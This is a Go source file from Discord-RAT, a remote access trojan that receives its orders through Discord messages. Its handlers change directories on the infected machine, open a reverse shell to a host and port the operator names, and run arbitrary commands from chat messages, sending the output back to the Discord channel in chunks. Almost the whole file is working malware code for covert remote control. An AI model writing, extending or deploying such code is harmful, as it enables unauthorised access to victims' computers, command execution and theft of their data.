/*
 * This file is part of the Discord-RAT project.
 * Repository: https://github.com/codeuk/discord-rat
 *
 * Written by codeuk (github.com/codeuk)
 *
 * Discord-RAT is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Discord-RAT is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Discord-RAT. If not, see <https://www.gnu.org/licenses/>.
 */
package commands

import (
	"fmt"
	"os"
	"strings"

	"github.com/codeuk/discord-rat/pkg/agent/system"
)

func HandleDirectoryChange(message *BotMessage) {
	// Parse the directory to move into.
	commandBreakdown := strings.Fields(message.Message.Content)

	if len(commandBreakdown) == 2 {
		destDirectory := commandBreakdown[1]

		// User wants to check the current directory.
		if destDirectory == "." {
			// Simply send the current directories location.
			go message.Session.ChannelMessageSend(message.Message.ChannelID, fmt.Sprintf("**Current location** ```%s```", system.CurrentDirectory))

			// We don't need to change directory now as the agent operator was just getting the current location.
			return
		}

		// Change into the supplied directory.
		if err := os.Chdir(destDirectory); err != nil {
			// Error encountered when changing into the directory.
			go message.Session.ChannelMessageSend(message.Message.ChannelID, fmt.Sprintf("**Failed to change into directory** ```%s```", destDirectory))
		} else {
			// Update the current directory.
			system.CurrentDirectory = system.GetCurrentDirectory()

			// Successfully changed into the passed directory.
			go message.Session.ChannelMessageSend(message.Message.ChannelID, fmt.Sprintf("**Successfully changed directory** ```%s```", system.CurrentDirectory))
		}
	} else {
		// Invalid cd command syntax.
		go message.Session.ChannelMessageSend(message.Message.ChannelID, "**Command usage** ```cd <directory> \nExample: \"cd my_folder\"```")
	}
}

func HandleShellConnection(message *BotMessage) {
	// Parse the field of the host to connect to.
	splitCommand := strings.Fields(message.Message.Content)

	if len(splitCommand) == 3 {
		go func() {
			serverToConnect := system.Server{ // Returns ClientSocket containing connection to server.
				Host: splitCommand[1],
				Port: splitCommand[2],
			}

			// Attempt to connect to the supplied server.
			if client, err := system.Connect(serverToConnect); err != nil {
				go message.Session.ChannelMessageSend(message.Message.ChannelID, "**Failed to connect to the shell server (timeout)**")
			} else {
				go message.Session.ChannelMessageSend(message.Message.ChannelID, "**Successfully connected to the shell server**")

				// Handle commands and connection persistence.
				client.Listen()
			}
		}()
	} else {
		go message.Session.ChannelMessageSend(message.Message.ChannelID, "**Command usage** ```shell <ip> <port> \nExample: shell 127.0.0.1 8080```")
	}
}

func HandleCommandExecution(message *BotMessage) {
	// Update channel in case the command execution takes a while...
	updateMessage, _ := message.Session.ChannelMessageSend(message.Message.ChannelID, "**Getting command output...**")

	// Execute the command supplied in the message.
	output := system.ExecuteCommand(message.Message.Content)
	if output == "" {
		// No output could be parsed from the command execution.
		go message.Session.ChannelMessageSend(message.Message.ChannelID, "**Command had no return...**")
	} else {
		// Split and parse the execution output into different chunks to avoid character limits.
		chunks := []string{}
		tempChunk := ""
		counter := 0

		// Create separate chunks for large messages.
		for char := 0; char < len(output); char++ {
			if counter < 1500 && char < len(output)-1 {
				tempChunk += string(output[char])
				counter++
			} else {
				if char == len(output)-1 {
					tempChunk += string(output[char])
				}

				// Add the temporary chunk to the output chunks.
				chunks = append(chunks, tempChunk)
				tempChunk = string(output[char])
				counter = 1
			}
		}

		// Send the chunks in a goroutine to prevent many from being sent and blocking command traffic.
		go func() {
			// Delete the initial update message, as it may clutter the output responses.
			message.Session.ChannelMessageDelete(updateMessage.ChannelID, updateMessage.ID)

			// Send all created message chunks as separate messages.
			// This is done to prevent Discord from throwing errors as character counts may be exceeded.
			for i, msgChunk := range chunks {
				message.Session.ChannelMessageSend(message.Message.ChannelID, fmt.Sprintf("**Message Chunk #%d/%d** ```%s```", i+1, len(chunks), msgChunk))
			}
		}()
	}
}
